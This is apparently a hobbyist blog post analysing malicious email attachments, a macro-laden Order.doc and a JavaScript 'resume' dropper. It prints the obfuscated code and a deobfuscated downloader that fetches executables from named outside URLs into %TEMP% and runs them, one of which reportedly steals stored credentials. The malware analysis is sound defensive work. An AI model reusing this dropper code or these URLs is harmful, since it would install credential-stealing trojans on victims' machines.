# Analyzing Some Malware from my Email

I have many of email accounts, many of which are defunct. While most of these have fallen off the face of the web, one in particular happens to still get ALOT of email, and within these emails are lots of malware.



# Analyzing Some Malware from my Email

I have many email accounts, many of which are defunct. While most of these
have fallen off the face of the web, one in particular happens to still
get ALOT of email, and within these emails are lots of malware.

I decided to spend some time taking apart some of these samples, to see what
people keep sending me!

# Order.doc

A few days ago I received this legitimate looking email...

> Dear Customerl<br/>
> <br/>
> Thank you for your recent purchase.<br/>
> <br/>
> Please find the details of your order through The Safety Supply Company attached to this email.
> <br/>
> Regards,
> <br/>
> <br/>
> The Sales Team<br/>

And attached was a file Order.doc. I extracted the Macros from the document and
found this nice section:

        Public Function OpenTarget(ByVal oDB As String) As Boolean
        Set RASTVA_1 = CreateObject(Replace("MicSiCorosoftSiCo.SiCoXMLSiCoHTTP", "SiCo", ""))
        Set RASTVA_2 = CreateObject(Replace("AdoRiCODBRiCO.RiCOStrRiCOeam", "RiCO", ""))
        Set RASTVA_3 = CreateObject(Mid("ldM3DAWSLL00((m", 7, 2) & "cri" + Left("pt.SGCANNA", 4) + "hell").Environment(Left("Pro%%hhdn", 3) + "cess")
        Set RASTVA_6 = CreateObject(Replace("SheBiCollBiCo.BiCoAppBiColicaBiCotion", "BiCo", ""))

           
I love the use of string replacement obfuscation here...If we get rid of it we see:

        Microsoft.XMLHTTP
        AdoDB.Stream
        WScript.ShellProcess
        ShellApplication
        
Further down the file we have:

        GIGNE = Array(8656, 8668, 8668, 8664, 8610, 8599, 8599, 8601, 8604, 8609, 8598, 8601, 8605, 8606, 8598, 8602, 8600, 8608, 8598, 8604, 8601, 8599, 8678, 8667, 8601, 8605, 8609, 8609, 8602, 8608, 8599, 8607, 8608, 8606, 8605, 8608, 8605, 8652, 8599, 8600, 8608, 8655, 8607, 8655, 8606, 8666, 8605, 8606, 8666, 8598, 8653, 8672, 8653)
        RASTVA_1.Open UCase(Mid("óàÎ5ger001@", 5, 2)) + "T", AddFieldToField(GIGNE, 52), False
        RASTVA_1.Send
        RASTVA_4 = RASTVA_3(Mid("AHSTECKED", 4, 2) + Right("JKHJKACMP", 2))
        RASTVA_5 = RASTVA_4 + Replace("\mostront.txt", "t", "e")
        
Again, some lovely obfuscation, let's break it out:

        Microsoft.XMLHTTP.Open GET, 
        Microsoft.XMLHTTP.Send
        WScript.ShellProcess(TEMP)
        WScript.ShellProcess(TEMP\monseone.exe)
        
To decode the AddFieldToField function, we have to go elsewhere in the document

        Public Function AddFieldToField(RASTVA_9() As Variant, RASTVA_10 As Integer) As String
         Dim RASTVA500 As String
         RASTVA500 = ""
         Dim RASTVA_8 As Integer
         For RASTVA_8 = LBound(RASTVA_9) To UBound(RASTVA_9)
         RASTVA500 = RASTVA500 & Chr(RASTVA_9(RASTVA_8) - RASTVA_10 - 7000 - 500 - 1000)
         Next RASTVA_8
         AddFieldToField = RASTVA500
        End Function
        
Yep, this doesn't look convulted at all. We know the first parameter is the array `GIGNE` and the second
is 52. The function loops over the array and creates a string by -52 -7000 -500 and -1000 from each byte.

That is 8552 from each. Decoded the array becomes:

        http://149.156.208.41/~s159928/786585d/08g7g6r56r.exe

Bam, we have the payload. When I was researching, this link was still active, so I grabbed a copy.

I uploaded the exe to [VirusTotal](https://www.virustotal.com/en/file/2d198392e831739f7f76ade37c08e66bd9f55e6e6fcc97f60c1a11ce8eef4988/analysis/) which registered it as a common trojan.


# Nelson Spencer

> Hello my name is  Nelson Spencer . <br/>
> My resume is attached for your approval.<br/>
> Sincerely<br/>
> Nelson Spencer<br/>

Attached was a zip file, which I naturally opened to find a single javascript file:

        var wmz='fanunjnptcrptboioyoaundj uadbtliu(pefpkrlj,bf stfdcnwg,vs hormxnrw)fn{nv oa upvuxaijrsj otwmuswh nq=jt hjnhqemuwiy usAswclitgnixfvpoehpXkdOkubkhjayeiuckitdp(ox"qlWhiSrjcwtryximtpjotrt.otSbbhayetclkilxd"bn)zl;tr ag zlviwaqyrmu ozftdnfc bu=wg ouwyhsvm.xzEquxarpcqananyldgdEclnpuvwwirvrbyosnnvpmcqepqnlatrgSwmtmurgjimlnxmghpsmm(hd"cd%qiTyuElmMdbPbb%ho"as)ne nn+zu ';var sdz='gaSqwtinrrcifqnztgow.jxfyarcmoaamskCobhogabcrdoCkhovtdwsein(hc9zh2fw)xi ue+ez jvfwxnex;al zf ndvxjacjrwu wkxseoav dy=dy xyntiefhwfp bkAqfcjatkdimgvamexjXoxOtqbppjnweuscaktsn(dg"rxMceSfhXkmMsqLdx2ht.raXrvMkkLggHzyTjbTpzPgb"ys)xx;eb nd tpxngoaw.xvorrnborvceaiakudujylzssatyjalpttdetzcgmhjgacgnyggvtevz iq=lv esfsfugqnzkcaftililtogbnir xp(vk)dv{vq hy te xs yyiopfz';var tjjwko='f ko(aaxusoul.carpcenaawldcqypsSwjtcjaittiaefw li=jq=im=xd dd4fa)at{es jx pg qy hl fs tpvmnawzrpy kfxjyabi jm=fg zknhkeqjwhw igAzpcentbtisrvpyeehXfaOinbzhjnsecfcpntwj(gg"neAtoDcnOgxDpdBcy.geSfgttmrtoegtayhmui"so)ur;vy ni vo mp tb zb gvxbfarl.zvookprgeomnam(dg)ev;dz os hy aa cb wa fjxuyatx.iutaiyuapnpevv rr=qa su1te;fa bu ui ry xa xm hrxzgahi.xtwpurltiugtbcehn';var ojyyp='(nvxpmovp.njRjmezksbhpogoobnvvsqmegkBrboebdotyol)xc;re os ff qy ge ls tuxqaamo.zgpitourskmixjtlzievoodnjs rt=yz sy0sj;jl aj pw qa rx kk ucxbhacf.jfsyqaksvrqeojTsjovhFqcizwlxgedp(aofqnnvu,as yy2oj)bw;mz it db ib ez wy fexutahj.xvcpylrsoqqszpelf(fb)vy;zn py xi hu yt}mm vt ou ts ke;uk zb gu}wl kl zr;pk sp kntharmiyct oi{aq ui sl mp jsxdtoff.wnoxepumezqnqe(ng"adG';var osrkpi='lpEfpTxm"xa,pq ikfezrem,zj obfnxaoilnnsueeia)pv;kt fv wi yd olxkhots.cpsqterqnzedsf(km)nm;is ld yt br uvigafij br(gbrvenvx bm>ru hu0hc)uv{yp ig yx sk kt cy qswuesiw.tpRbduyvnpt(vgfbwnlq,xa xu0ew,pq pp0hs)wf;bc rf iv qt mh}og di zq qp jx;to en ci}at zk mxccbawetxlctnhuk th(xxemsrqo)dv{jj sh bm}xt qa ck;ot}eydmmlxy(fg"dqhjdtsptlzpjv:cu/hb/ueefesolrehigdopjthsey';var hvgp='nrenfrb.rncnjoecmxx/zhilemiugfr/yxsakcterxqidbppvtxh.vgppohrjpht?bodtgcanmec1zf.qdjizpqkglf"bt,ba hy"mx5hw5qe7so4ur9em2ou2aj.mnenqxavead"xm,nb az1wu)qn;rddrhlzk(wm"gehnktxhtxapvl:oy/kw/ymelyssyrliiljordtndepqrujfuw.dicisodbmze/bsiekmjzgxp/ycsljcmjrnditapjdtzn.wepwdhfepja?sfdqkcjwmmz2bh.rkjunpqdgei"lj,xn sl"pu3yo3ou7ai3sh1eq1pc5jq.breebxfwefv"fj,xq cd1xp)dr;mw';var denqbimerb=wmz+sdz+tjjwko+ojyyp+osrkpi+hvgp;   var dyixoonn="";   var zikeknrp=3;   var bauvnlxvy=denqbimerb["split"]("");   var zaeoynlmc="";      var r="Sc"+"ri"+"pti"+"ng.Di"+"ctio"+"nary";   var y = new ActiveXObject(r);   y.add ("a", "t");      if (y.Item("a")=="t"){zaeoynlmc="yed";}else{zikeknrp=0;};         for (i=0;i<bauvnlxvy.length;i +=zikeknrp){   dyixoonn=dyixoonn+bauvnlxvy[i];}   var zaeoynlmc="yedeyedvyedayedl"["split"](zaeoynlmc)["join"]("");   var afdjpiud=this;   var tcrjwnxik=afdjpiud[zaeoynlmc];   tcrjwnxik(dyixoonn);        //KgXeyWbMRu
        
It seems Nelson has quite the impressive resume. Let's clean this up:

        var wmz='fanunjnptcrptboioyoaundj uadbtliu(pefpkrlj,bf stfdcnwg,vs hormxnrw)fn{nv oa upvuxaijrsj otwmuswh nq=jt hjnhqemuwiy usAswclitgnixfvpoehpXkdOkubkhjayeiuckitdp(ox"qlWhiSrjcwtryximtpjotrt.otSbbhayetclkilxd"bn)zl;tr ag zlviwaqyrmu ozftdnfc bu=wg ouwyhsvm.xzEquxarpcqananyldgdEclnpuvwwirvrbyosnnvpmcqepqnlatrgSwmtmurgjimlnxmghpsmm(hd"cd%qiTyuElmMdbPbb%ho"as)ne nn+zu ';
        var sdz='gaSqwtinrrcifqnztgow.jxfyarcmoaamskCobhogabcrdoCkhovtdwsein(hc9zh2fw)xi ue+ez jvfwxnex;al zf ndvxjacjrwu wkxseoav dy=dy xyntiefhwfp bkAqfcjatkdimgvamexjXoxOtqbppjnweuscaktsn(dg"rxMceSfhXkmMsqLdx2ht.raXrvMkkLggHzyTjbTpzPgb"ys)xx;eb nd tpxngoaw.xvorrnborvceaiakudujylzssatyjalpttdetzcgmhjgacgnyggvtevz iq=lv esfsfugqnzkcaftililtogbnir xp(vk)dv{vq hy te xs yyiopfz';
        var tjjwko='f ko(aaxusoul.carpcenaawldcqypsSwjtcjaittiaefw li=jq=im=xd dd4fa)at{es jx pg qy hl fs tpvmnawzrpy kfxjyabi jm=fg zknhkeqjwhw igAzpcentbtisrvpyeehXfaOinbzhjnsecfcpntwj(gg"neAtoDcnOgxDpdBcy.geSfgttmrtoegtayhmui"so)ur;vy ni vo mp tb zb gvxbfarl.zvookprgeomnam(dg)ev;dz os hy aa cb wa fjxuyatx.iutaiyuapnpevv rr=qa su1te;fa bu ui ry xa xm hrxzgahi.xtwpurltiugtbcehn';
        var ojyyp='(nvxpmovp.njRjmezksbhpogoobnvvsqmegkBrboebdotyol)xc;re os ff qy ge ls tuxqaamo.zgpitourskmixjtlzievoodnjs rt=yz sy0sj;jl aj pw qa rx kk ucxbhacf.jfsyqaksvrqeojTsjovhFqcizwlxgedp(aofqnnvu,as yy2oj)bw;mz it db ib ez wy fexutahj.xvcpylrsoqqszpelf(fb)vy;zn py xi hu yt}mm vt ou ts ke;uk zb gu}wl kl zr;pk sp kntharmiyct oi{aq ui sl mp jsxdtoff.wnoxepumezqnqe(ng"adG';
        var osrkpi='lpEfpTxm"xa,pq ikfezrem,zj obfnxaoilnnsueeia)pv;kt fv wi yd olxkhots.cpsqterqnzedsf(km)nm;is ld yt br uvigafij br(gbrvenvx bm>ru hu0hc)uv{yp ig yx sk kt cy qswuesiw.tpRbduyvnpt(vgfbwnlq,xa xu0ew,pq pp0hs)wf;bc rf iv qt mh}og di zq qp jx;to en ci}at zk mxccbawetxlctnhuk th(xxemsrqo)dv{jj sh bm}xt qa ck;ot}eydmmlxy(fg"dqhjdtsptlzpjv:cu/hb/ueefesolrehigdopjthsey';
        var hvgp='nrenfrb.rncnjoecmxx/zhilemiugfr/yxsakcterxqidbppvtxh.vgppohrjpht?bodtgcanmec1zf.qdjizpqkglf"bt,ba hy"mx5hw5qe7so4ur9em2ou2aj.mnenqxavead"xm,nb az1wu)qn;rddrhlzk(wm"gehnktxhtxapvl:oy/kw/ymelyssyrliiljordtndepqrujfuw.dicisodbmze/bsiekmjzgxp/ycsljcmjrnditapjdtzn.wepwdhfepja?sfdqkcjwmmz2bh.rkjunpqdgei"lj,xn sl"pu3yo3ou7ai3sh1eq1pc5jq.breebxfwefv"fj,xq cd1xp)dr;mw';
        var denqbimerb=wmz+sdz+tjjwko+ojyyp+osrkpi+hvgp;   
        var dyixoonn="";   
        var zikeknrp=3;   
        var bauvnlxvy=denqbimerb["split"]("");   
        var zaeoynlmc="";      
        var r="Sc"+"ri"+"pti"+"ng.Di"+"ctio"+"nary";   
        var y = new ActiveXObject(r);   
        y.add ("a", "t");      
        if (y.Item("a")=="t"){
            zaeoynlmc="yed";
        }else{
            zikeknrp=0;
        };         
        for (i=0;i<bauvnlxvy.length;i +=zikeknrp) {   
            dyixoonn=dyixoonn+bauvnlxvy[i];
        }   
        var zaeoynlmc="yedeyedvyedayedl"["split"](zaeoynlmc)["join"]("");     
        var tcrjwnxik=this[zaeoynlmc];   
        tcrjwnxik(dyixoonn);        //KgXeyWbMRu

The first few lines are just strings which get added together in `denqbimerb` and
then split again by in `bauvnlxvy`.

`r` obviously becomes `Scripting.Dictionary`

We know have some minor deobfuscation to do in that loop function:

        for (i=0;i<array.length; i+=3) {
            string=string+array[i]
        }

Doing this we get the output:

        function dl(fr, fn, rn){  var ws = new ActiveXObject("WScript.Shell");  var fn = ws.ExpandEnvironmentStrings("%TEMP%") + String.fromCharCode(92) + fn;  var xo = new ActiveXObject("MSXML2.XMLHTTP");  xo.onreadystatechange = function (){    if (xo.readyState === 4){      var xa = new ActiveXObject("ADODB.Stream");      xa.open();      xa.type = 1;      xa.write(xo.ResponseBody);      xa.position = 0;      xa.saveToFile(fn, 2);      xa.close();    }    ;  }  ;  try {    xo.open("GET", fr, false);    xo.send();    if (rn > 0){      ws.Run(fn, 0, 0);    }    ;  }  catch (er){  }  ;}dl("http://esrioterf.com/img/script.php?dcm1.jpg", "5574922.exe", 1);dl("http://esrioterf.com/img/script.php?dcm2.jpg", "3373115.exe", 1);

Let's clean this up:

            function dl(fr, fn, rn){ 
             var ws = new ActiveXObject("WScript.Shell"); 
             var fn = ws.ExpandEnvironmentStrings("%TEMP%") + String.fromCharCode(92) + fn;  
             var xo = new ActiveXObject("MSXML2.XMLHTTP");  
             xo.onreadystatechange = function (){   
                if (xo.readyState === 4){     
                     var xa = new ActiveXObject("ADODB.Stream");      
                     xa.open();      
                     xa.type = 1;      
                     xa.write(xo.ResponseBody);      
                     xa.position = 0;      
                     xa.saveToFile(fn, 2);      
                     xa.close();    
                };  
                };  
                try {    
                    xo.open("GET", fr, false);    
                    xo.send();    
                    if (rn > 0){      
                        ws.Run(fn, 0, 0);    
                    };  
                 }  catch (er){  
                 };
        }
        dl("http://esrioterf.com/img/script.php?dcm1.jpg", "5574922.exe", 1);dl("http://esrioterf.com/img/script.php?dcm2.jpg", "3373115.exe", 1);
        
Looks like we are lucky here...2 malware samples to play with.

The bottom three lines of the original JS simply obfuscate an eval call on the string we just parsed

        var zaeoynlmc="yedeyedvyedayedl"["split"](zaeoynlmc)["join"]("");  //eval
        var tcrjwnxik=this[zaeoynlmc]; // this[eval]
        tcrjwnxik(dyixoonn); // eval(dyixoonn)

So what have we got?

## 5574922.exe and 3373115.exe

I uploaded these to [Malwr](https://malwr.com/analysis/NTUxNGU0M2Y2NTQ2NGNmY2E2YWExNGJhNzk2YTkzMmI/)
[2](https://malwr.com/analysis/NDc5NmUzZDcwMzNkNDIzMDg4ZDk1OGI3ZjA0NzhkNWY/)

3373115.exe is more interesting as it spends most of it's time harvesting credentials from local profiles
including Mozilla Firefox and CuteFTP.

Nelson Spencer has a very interesting resume indeed.

# Summary

I got bored on a Friday evening and decided to analyse the malware that was sent to one of my email
address this week.

I'm going to keep an eye out for interesting emails in the future and likely do another round of this. It was quite fun.
